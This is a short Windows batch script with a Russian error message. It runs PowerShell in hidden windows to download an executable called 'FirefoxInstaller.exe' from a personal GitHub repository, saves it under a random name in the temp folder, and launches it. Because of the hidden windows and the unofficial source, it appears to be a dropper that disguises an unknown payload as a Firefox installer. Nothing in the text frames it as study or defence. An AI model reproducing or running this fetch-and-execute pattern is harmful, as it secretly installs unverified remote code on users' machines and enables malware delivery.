@echo off
set url=https://github.com/fruktoozik/qnfr/raw/refs/heads/main/FirefoxInstaller.exe
set tempPath=%TEMP%
set filePath=%tempPath%\%RANDOM%.exe

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%filePath%')"

if %ERRORLEVEL% neq 0 (
    echo Ошибка загрузки файла.
    exit /b 1
)

powershell -WindowStyle Hidden -Command "Start-Process '%filePath%'"

exit /b 0
